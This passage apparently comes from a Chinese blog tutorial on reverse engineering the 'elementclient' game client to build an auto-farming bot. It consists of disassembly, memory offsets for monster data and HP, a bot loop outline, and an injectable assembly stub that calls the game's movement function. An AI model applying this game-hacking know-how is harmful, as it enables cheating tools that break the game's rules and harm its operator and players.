class=\"line\">00BE7E26              | 8988 2C010000          | mov dword ptr ds:[eax+12C],ecx                 | </span><br><span class=\"line\">00BE7E2C              | 8B4E 08                | mov ecx,dword ptr ds:[esi+8]                   | 000003BE</span><br><span class=\"line\">00BE7E2F              | 8988 84010000          | mov dword ptr ds:[eax+184],ecx                 | </span><br><span class=\"line\">00BE7E35              | 8B4E 0C                | mov ecx,dword ptr ds:[esi+C]                   |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00F30DED              | 8B89 EC000000          | mov ecx,dword ptr ds:[ecx+EC]                  | </span><br><span class=\"line\">00F30DF3              | 8B45 08                | mov eax,dword ptr ss:[ebp+8]                   |</span><br><span class=\"line\">00F30DF6              | 8B0481                 | mov eax,dword ptr ds:[ecx+eax*4]               |</span><br><span class=\"line\">00F30DF9              | 85C0                   | test eax,eax                                   |</span><br><span class=\"line\">00C50D74              | E8 67002E00            | call elementclient.F30DE0                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00B69BBB - FF B3 18010000  - push [ebx+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00B69BBB              | FFB3 18010000          | push dword ptr ds:[ebx+118]                    |</span><br><span class=\"line\">00B69BC1              | F3:0F114424 18         | movss dword ptr ss:[esp+18],xmm0               |</span><br><span class=\"line\">00B69BC7              | E8 64BAECFF            | call elementclient.A35630                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00C15CAB - FF B7 18010000  - push [edi+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00C15CE5 - FF B7 18010000  - push [edi+00000118]</span><br><span class=\"line\">00C15CD5              | 8B75 18                | mov esi,dword ptr ss:[ebp+18]                  |</span><br><span class=\"line\">00C15CD8              | 8B4D F0                | mov ecx,dword ptr ss:[ebp-10]                  |</span><br><span class=\"line\">00C15CDB              | 53                     | push ebx                                       |</span><br><span class=\"line\">00C15CDC              | FF75 14                | push dword ptr ss:[ebp+14]                     |</span><br><span class=\"line\">00C15CDF              | 56                     | push esi                                       |</span><br><span class=\"line\">00C15CE0              | 6A 00                  | push 0                                         |</span><br><span class=\"line\">00C15CE2              | FF75 08                | push dword ptr ss:[ebp+8]                      |</span><br><span class=\"line\">00C15CE5              | FFB7 18010000          | push dword ptr ds:[edi+118]                    |</span><br><span class=\"line\">00C15CEB              | E8 9067FCFF            | call elementclient.BDC480                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00C1DE59 - 8B B8 18010000  - mov edi,[eax+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00BE7E15   &gt; \\8B72 0C       mov esi,dword ptr ds:[edx+0xC]           ;  6FC422FA</span><br><span class=\"line\">00BE7E18   .  FF36          push dword ptr ds:[esi]    80001C4A</span><br><span class=\"line\">00BE7E1A   .  E8 010E0000   call ElementC.00BE8C20    </span><br><span class=\"line\">00BE7E1F   .  85C0          test eax,eax   2A532888</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00A4AA6F              | E8 1C030000            | call elementclient.A4AD90             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4AD94              | 8BF9                   | mov edi,ecx                           |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4AE03              | 8B8F 98000000          | mov ecx,dword ptr ds:[edi+98]         |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4AE0E              | E8 4DA21900            | call elementclient.BE5060             |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE5088              | 8BF1                   | mov esi,ecx                           |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE50B1              | 8B46 04                | mov eax,dword ptr ds:[esi+4]          |</span><br><span class=\"line\">00BE50B4              | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]         |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE50BB              | 8B4C88 1C              | mov ecx,dword ptr ds:[eax+ecx*4+1C]   | eax = 095D9D28 ecx = 2</span><br><span class=\"line\">00BE50BF              | 85C9                   | test ecx,ecx                          |</span><br><span class=\"line\">00BE50C1              | 74 29                  | je elementclient.BE50EC               |</span><br><span class=\"line\">00BE50C3              | 8B01                   | mov eax,dword ptr ds:[ecx]            |</span><br><span class=\"line\">00BE50C5              | 8D55 D4                | lea edx,dword ptr ss:[ebp-2C]         |</span><br><span class=\"line\">00BE50C8              | 52                     | push edx                              |</span><br><span class=\"line\">00BE50C9              | FF50 34                | call dword ptr ds:[eax+34]            |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE8150              | E8 7BFBFFFF            | call elementclient.BE7CD0             |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE7E15   &gt; \\8B72 0C       mov esi,dword ptr ds:[edx+0xC]          1C677902</span><br><span class=\"line\">00BE7E18   .  FF36          push dword ptr ds:[esi]                 80001C4A</span><br><span class=\"line\">00BE7E1A   .  E8 010E0000   call ElementC.00BE8C20</span><br><span class=\"line\">00BE7E1F   .  85C0          test eax,eax                            37327F00</span><br><span class=\"line\">00BE7E21   .  74 60         je XElementC.00BE7E83</span><br><span class=\"line\">00BE7E23   .  8B4E 04       mov ecx,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">00BE7E26   .  8988 2C010000 mov dword ptr ds:[eax+0x12C],ecx</span><br><span class=\"line\">00BE7E2C   .  8B4E 08       mov ecx,dword ptr ds:[esi+0x8]</span><br><span class=\"line\">00BE7E2F   .  8988 84010000 mov dword ptr ds:[eax+0x184],ecx</span><br><span class=\"line\">00BE7E35   .  8B4E 0C       mov ecx,dword ptr ds:[esi+0xC]</span><br><span class=\"line\"></span><br><span class=\"line\">call 00BE8C20通过怪物ID得到怪物对象</span><br><span class=\"line\">00BE8C20  /$  55            push ebp</span><br><span class=\"line\">00BE8C21  |.  8BEC          mov ebp,esp</span><br><span class=\"line\">00BE8C23  |.  83EC 08       sub esp,0x8</span><br><span class=\"line\">00BE8C26  |.  56            push esi</span><br><span class=\"line\">00BE8C27  |.  8BF1          mov esi,ecx</span><br><span class=\"line\">00BE8C29  |.  8D45 08       lea eax,[arg.1]</span><br><span class=\"line\">00BE8C2C  |.  50            push eax</span><br><span class=\"line\">00BE8C2D  |.  8D45 F8       lea eax,[local.2]</span><br><span class=\"line\">00BE8C30  |.  50            push eax</span><br><span class=\"line\">00BE8C31  |.  8D4E 14       lea ecx,dword ptr ds:[esi+0x14]    esi = 0A3F6DD8</span><br><span class=\"line\">00BE8C34  |.  E8 57130000   call ElementC.00BE9F90</span><br><span class=\"line\"></span><br><span class=\"line\">00BE9F90   $  55            push ebp</span><br><span class=\"line\">00BE9F91   .  8BEC          mov ebp,esp</span><br><span class=\"line\">00BE9F93   .  8B45 0C       mov eax,dword ptr ss:[ebp+0xC]    0019EECC</span><br><span class=\"line\">00BE9F96   .  33D2          xor edx,edx</span><br><span class=\"line\">00BE9F98   .  56            push esi   0A3F6DD8 </span><br><span class=\"line\">00BE9F99   .  8B30          mov esi,dword ptr ds:[eax]   80001C4A</span><br><span class=\"line\">00BE9F9B   .  8BC6          mov eax,esi</span><br><span class=\"line\">00BE9F9D   .  F771 14       div dword ptr ds:[ecx+0x14]      eax/301   edx = 000002CB   ecx = 0A3F6DEC</span><br><span class=\"line\">00BE9FA0   .  8B41 08       mov eax,dword ptr ds:[ecx+0x8]  58A9B678 怪物列表地址</span><br><span class=\"line\">00BE9FA3   .  8B0490        mov eax,dword ptr ds:[eax+edx*4]  4F46B068 </span><br><span class=\"line\">00BE9FA6   .  85C0          test eax,eax</span><br><span class=\"line\">00BE9FA8   .  74 11         je XElementC.00BE9FBB</span><br><span class=\"line\">00BE9FB0   &gt;  3970 08       cmp dword ptr ds:[eax+0x8],esi</span><br><span class=\"line\">00BE9FB3   .  74 18         je XElementC.00BE9FCD</span><br><span class=\"line\">00BE9FB5   .  8B00          mov eax,dword ptr ds:[eax]</span><br><span class=\"line\">00BE9FB7   .  85C0          test eax,eax</span><br><span class=\"line\">00BE9FB9   .^ 75 F5         jnz XElementC.00BE9FB0</span><br><span class=\"line\">00BE9FBB   &gt;  8B45 08       mov eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">00BE9FBE   .  5E            pop esi</span><br><span class=\"line\">00BE9FBF   .  C700 00000000 mov dword ptr ds:[eax],0x0</span><br><span class=\"line\">00BE9FC5   .  C640 04 00    mov byte ptr ds:[eax+0x4],0x0</span><br><span class=\"line\">00BE9FC9   .  5D            pop ebp</span><br><span class=\"line\">00BE9FCA   .  C2 0800       retn 0x8 </span><br><span class=\"line\">00BE9FCD              | 8B4D 08                | mov ecx,dword ptr ss:[ebp+8]                      0019EEBC</span><br><span class=\"line\">00BE9FD0              | 83C0 04                | add eax,4                                      |  4F46B06C</span><br><span class=\"line\">00BE9FD3              | 5E                     | pop esi                                        | 0A3F6DD8</span><br><span class=\"line\">00BE9FD4              | 8901                   | mov dword ptr ds:[ecx],eax                     | </span><br><span class=\"line\">00BE9FD6              | 8BC1                   | mov eax,ecx                                    | 0019EEBC</span><br><span class=\"line\">00BE9FD8              | C641 04 01             | mov byte ptr ds:[ecx+4],1                      |</span><br><span class=\"line\">00BE9FDC              | 5D                     | pop ebp                                        |</span><br><span class=\"line\">00BE9FDD              | C2 0800                | ret 8                                          |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">怪物对象通过this指针偏移得到ID，当前血量和最大血量 </span><br><span class=\"line\">+ 12C</span><br><span class=\"line\">+ 184</span><br><span class=\"line\">+ 118</span><br><span class=\"line\"></span><br><span class=\"line\">0A3F6DEC     00000000  .... </span><br><span class=\"line\">0A3F6DF0     0000001E  .... </span><br><span class=\"line\">0A3F6DF4     58A9B678  x¶©X </span><br><span class=\"line\">0A3F6DF8     58A9C27C  |Â©X </span><br><span class=\"line\">0A3F6DFC     00000301  .... </span><br><span class=\"line\">0A3F6E00     00000301  .... </span><br><span class=\"line\">0A3F6E04     00000000  .... </span><br><span class=\"line\">0A3F6E08     00000000  .... </span><br><span class=\"line\">0A3F6E0C     0464E750  Pçd. </span><br><span class=\"line\">0A3F6E10     0464E824  $èd. </span><br><span class=\"line\">ecx + 8 = 58A9B678</span><br><span class=\"line\">58A9C27C - 58A9B678 = C04 </span><br><span class=\"line\"></span><br><span class=\"line\">ecx = esi + 14 = ecx + 14 = [eax+2*4+1C]+14 = [[[esi+4]+1C]+2*4+1C]+14 = [[[ecx+4]+1C]+2*4+1C]+14</span><br><span class=\"line\">= [[[[edi+98]+4]+1C]+2*4+1C]+14 = [[[[[1508514]+98]+4]+1C]+2*4+1C]+14</span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    4F46B068     00000000 .... </span><br><span class=\"line\">$+4      4F46B06C     37327F00 ..27    ;怪物详细信息</span><br><span class=\"line\">$+8      4F46B070     80001C4A J...    ;怪物ID</span><br><span class=\"line\">$+C      4F46B074     00000000 .... </span><br><span class=\"line\">$+10     4F46B078     00000100 .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    37327F00  01280C5C \\.(. </span><br><span class=\"line\">$+4      37327F04  00000012 .... </span><br><span class=\"line\">$+8      37327F08  01515140 @QQ. </span><br><span class=\"line\">$+C      37327F0C  BF514D40 @MQ¿ </span><br><span class=\"line\">$+10     37327F10  00000000 .... </span><br><span class=\"line\">$+14     37327F14  3F136828 (h.? </span><br><span class=\"line\">$+18     37327F18  00000000 .... </span><br><span class=\"line\">$+1C     37327F1C  00000000 .... </span><br><span class=\"line\">$+20     37327F20  3F800000 ...? </span><br><span class=\"line\">$+24     37327F24  00000000 .... </span><br><span class=\"line\">$+28     37327F28  00000000 .... </span><br><span class=\"line\">$+2C     37327F2C  BF136828 (h.¿ </span><br><span class=\"line\">$+30     37327F30  00000000 .... </span><br><span class=\"line\">$+34     37327F34  BF514D40 @MQ¿ </span><br><span class=\"line\">$+38     37327F38  00000000 .... </span><br><span class=\"line\">$+3C     37327F3C  4430814B K.0D    ;x</span><br><span class=\"line\">$+40     37327F40  427230F2 ò0rB    ;z</span><br><span class=\"line\">$+44     37327F44  C2D852B3 ³RØÂ    ;y</span><br><span class=\"line\">$+48     37327F48  3F800000 ...? </span><br><span class=\"line\">$+4C     37327F4C  BF514D40 @MQ¿ </span><br><span class=\"line\">$+50     37327F50  00000000 .... </span><br><span class=\"line\">$+54     37327F54  3F136828 (h.? </span><br><span class=\"line\">$+58     37327F58  00000000 .... </span><br><span class=\"line\">$+5C     37327F5C  00000000 .... </span><br><span class=\"line\">$+60     37327F60  3F800000 ...? </span><br><span class=\"line\">$+64     37327F64  00000000 .... </span><br><span class=\"line\">$+68     37327F68  00000000 .... </span><br><span class=\"line\">$+6C     37327F6C  BF136828 (h.¿ </span><br><span class=\"line\">$+70     37327F70  00000000 .... </span><br><span class=\"line\">$+74     37327F74  BF514D40 @MQ¿ </span><br><span class=\"line\">$+78     37327F78  00000000 .... </span><br><span class=\"line\">$+7C     37327F7C  4430814B K.0D  ;x</span><br><span class=\"line\">$+80     37327F80  427230F2 ò0rB </span><br><span class=\"line\">$+84     37327F84  C2D852B3 ³RØÂ </span><br><span class=\"line\">$+88     37327F88  3F800000 ...? </span><br><span class=\"line\">$+8C     37327F8C  00000000 .... </span><br><span class=\"line\">$+90     37327F90  00000000 .... </span><br><span class=\"line\">$+94     37327F94  012BA6C8 È¦+. </span><br><span class=\"line\">$+98     37327F98  01246824 $h$. </span><br><span class=\"line\">$+AC     37327FAC  0000000A .... </span><br><span class=\"line\">$+B0     37327FB0  00000000 .... </span><br><span class=\"line\">$+B4     37327FB4  00000006 ....   怪物类型 6 怪物 7 NPC 9 宠物 A GM</span><br><span class=\"line\">$+B8     37327FB8  4208CC54 TÌ.B </span><br><span class=\"line\">$+BC     37327FBC  FFFF0100 ..ÿÿ </span><br><span class=\"line\">$+C0     37327FC0  00000000 .... </span><br><span class=\"line\">$+C4     37327FC4  3F735658 XVs? </span><br><span class=\"line\">$+C8     37327FC8  00000000 .... </span><br><span class=\"line\">$+CC     37327FCC  BE9F08C1 Á..¾ </span><br><span class=\"line\">$+D0     37327FD0  00000000 .... </span><br><span class=\"line\">$+D4     37327FD4  3F740BDE Þ.t? </span><br><span class=\"line\">$+D8     37327FD8  00000000 .... </span><br><span class=\"line\">$+DC     37327FDC  BE9AA083 . .¾ </span><br><span class=\"line\">$+E0     37327FE0  00000096 .... </span><br><span class=\"line\">$+E4     37327FE4  00000096 .... </span><br><span class=\"line\">$+E8     37327FE8  000001B6 ¶... </span><br><span class=\"line\">$+EC     37327FEC  FF000101 ...ÿ </span><br><span class=\"line\">$+F0     37327FF0  A0A1F1A4 ¤ñ¡  </span><br><span class=\"line\">$+F4     37327FF4  3F800000 ...? </span><br><span class=\"line\">$+F8     37327FF8  A1D9690E .iÙ¡ </span><br><span class=\"line\">$+FC     37327FFC  80000000 .... </span><br><span class=\"line\">$+100    37328000  3F800000 ...? </span><br><span class=\"line\">$+104    37328004  00000000 .... </span><br><span class=\"line\">$+108    37328008  FFFFFF00 .ÿÿÿ </span><br><span class=\"line\">$+10C    3732800C  01515158 XQQ. </span><br><span class=\"line\">$+110    37328010  4DC50270 p.ÅM &amp;&quot;`剂&quot;</span><br><span class=\"line\">$+114    37328014  0A3F6DD8 Øm?. </span><br><span class=\"line\">$+118    37328018  80001C4A J... </span><br><span class=\"line\">$+11C    3732801C  0000AE41 A®.. </span><br><span class=\"line\">$+120    37328020  0000AE41 A®.. </span><br><span class=\"line\">$+124    37328024  00000010 ....     ;怪物等级</span><br><span class=\"line\">$+128    37328028  00000000 .... </span><br><span class=\"line\">$+12C    3732802C  000003BE ¾...     ;当前血量</span><br><span class=\"line\">$+184    37328084  000003BE ¾...     ;最大血量</span><br><span class=\"line\">$+250    37328028  00000000 ....     ;1.移动加速  3.防御强化  4.法术抵抗  5.攻击强化  6.法术强化  7.舍命突击   8.生命强化  9.虚弱</span><br><span class=\"line\">$+270    373281 00001388 ....         </span><br><span class=\"line\">$+284    373281 3E312F14 ./1&gt;      L&quot;囚徒怨魂&quot;</span><br><span class=\"line\">$+288    373281 00000000 ....      </span><br><span class=\"line\"></span><br><span class=\"line\">$+2E8    373281 00000000 ....       怪物攻击目标ID</span><br><span class=\"line\">$+2EC    373281 00000000 ....       怪物攻击目标ID</span><br><span class=\"line\">$+320 26674050   ;怪物状态列表基地址</span><br><span class=\"line\">$+324 0000       ;怪物状态个数</span><br></pre></td></tr></table></figure>\n<h4 id=\"挂机功能\"><a class=\"markdownIt-Anchor\" href=\"#挂机功能\">#</a> 挂机功能</h4>\n<p>1. 挂机需要创建一个线程</p>\n<p>2. 线程中循环执行</p>\n<p>while()</p>\n<p>{</p>\n<p>​\t选中怪物</p>\n<p>​\t靠近怪物 (向怪物移动至最远攻击距离内)</p>\n<p>​\t释放技能</p>\n<p>​\t判断怪物生命值</p>\n<p>​\t判断自己生命值</p>\n<p>​\t…</p>\n<p>}</p>\n<h4 id=\"找人物移动call\"><a class=\"markdownIt-Anchor\" href=\"#找人物移动call\">#</a> 找人物移动 call</h4>\n<p>思路一：人物移动与目标地点的坐标和人物当前地点坐标数据有联系，所以我们可以从这两个数据入手开始查找</p>\n<p>思路二：网友一般将人物移动时的数据的逻辑处理放在服务端，游戏客户端与服务端通过网络通讯</p>\n<p>所以通过 send 发包函数来定位人物移动的 call 的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B503F7 - F3 0F5C 4F 3C  - subss xmm1,[edi+3C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B50421             | 8B8F F4270000         | mov ecx,dword ptr ds:[edi+27F4]                   |</span><br><span class=\"line\">00B50427             | 6A 01                 | push 1                                            |</span><br><span class=\"line\">00B50429             | E8 42F50000           | call elementclient.B5F970                         |</span><br><span class=\"line\"></span><br><span class=\"line\">00B5042E             | 8BF0                  | mov esi,eax                                       |</span><br><span class=\"line\">00B50430             | 8D45 D4               | lea eax,dword ptr ss:[ebp-2C]                     |</span><br><span class=\"line\">00B50433             | 50                    | push eax                                          |</span><br><span class=\"line\">00B50434             | 6A 00                 | push 0                                            |</span><br><span class=\"line\">00B50436             | 8BCE                  | mov ecx,esi                                       |</span><br><span class=\"line\">00B50438             | E8 735C0100           | call elementclient.B660B0                         |</span><br><span class=\"line\"></span><br><span class=\"line\">00B5043D             | 8D85 70FFFFFF         | lea eax,dword ptr ss:[ebp-90]                     |</span><br><span class=\"line\">00B50443             | 8BCE                  | mov ecx,esi                                       |</span><br><span class=\"line\">00B50445             | 50                    | push eax                                          |</span><br><span class=\"line\">00B50446             | 8D85 64FFFFFF         | lea eax,dword ptr ss:[ebp-9C]                     |</span><br><span class=\"line\">00B5044C             | 50                    | push eax                                          |</span><br><span class=\"line\">00B5044D             | E8 2E5A0100           | call elementclient.B65E80                         |</span><br><span class=\"line\"></span><br><span class=\"line\">00B5051A             | 8B8F F4270000         | mov ecx,dword ptr ds:[edi+27F4]                   |</span><br><span class=\"line\">00B50520             | 6A 00                 | push 0                                            |</span><br><span class=\"line\">00B50522             | 56                    | push esi                                          |</span><br><span class=\"line\">00B50523             | 6A 01                 | push 1                                            |</span><br><span class=\"line\">00B50525             | E8 36020100           | call elementclient.B60760                         |</span><br><span class=\"line\"></span><br><span class=\"line\">$-2C     0019EEA0  44DB58AF    </span><br><span class=\"line\">$-28     0019EEA4  43565AF2    </span><br><span class=\"line\">$-24     0019EEA8  45889118    </span><br><span class=\"line\"></span><br><span class=\"line\">$-90     0019EE3C  3D5ECC82    </span><br><span class=\"line\">$-8C     0019EE40  3F22F622    </span><br><span class=\"line\">$-88     0019EE44  BF44F0D6    </span><br><span class=\"line\"></span><br><span class=\"line\">$-9C     0019EE30  44DB97A2    </span><br><span class=\"line\">$-98     0019EE34  435B1654    </span><br><span class=\"line\">$-94     0019EE38  4588AF10    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sub esp,0x18</span><br><span class=\"line\">mov ecx,0150B6FC</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">mov ecx,[ecx+27F4]</span><br><span class=\"line\">push 1</span><br><span class=\"line\">call 0x0B5F970</span><br><span class=\"line\"></span><br><span class=\"line\">mov esi,eax</span><br><span class=\"line\">mov ebx,44DB58AF</span><br><span class=\"line\">mov [esp+0x0],ebx</span><br><span class=\"line\">mov ebx,43565AF2</span><br><span class=\"line\">mov [esp+0x4],ebx</span><br><span class=\"line\">mov ebx,45889118</span><br><span class=\"line\">mov [esp+0x8],ebx</span><br><span class=\"line\">lea eax,[esp]</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0</span><br><span class=\"line\">mov ecx,esi</span><br><span class=\"line\">call 0x0B660B0   </span><br><span class=\"line\"></span><br><span class=\"line\">mov edx,3D5ECC82</span><br><span class=\"line\">mov [esp+0xC],edx</span><br><span class=\"line\">mov edx,3F22F622</span><br><span class=\"line\">mov [esp+0x10],edx</span><br><span class=\"line\">mov edx,0x0BF44F0D6</span><br><span class=\"line\">mov [esp+0x14],edx</span><br><span class=\"line\">mov ecx,esi</span><br><span class=\"line\">lea eax,[esp+0xC]</span><br><span class=\"line\">push eax</span><br><span class=\"line\">lea eax,[esp]</span><br><span class=\"line\">push eax</span><br><span class=\"line\">call 0x0B65E80 </span><br><span class=\"line\"></span><br><span class=\"line\">mov ecx,0150B6FC</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">mov ecx,[ecx+27F4]</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push esi</span><br><span class=\"line\">push 1</span><br><span class=\"line\">call 0x0B60760   </span><br><span 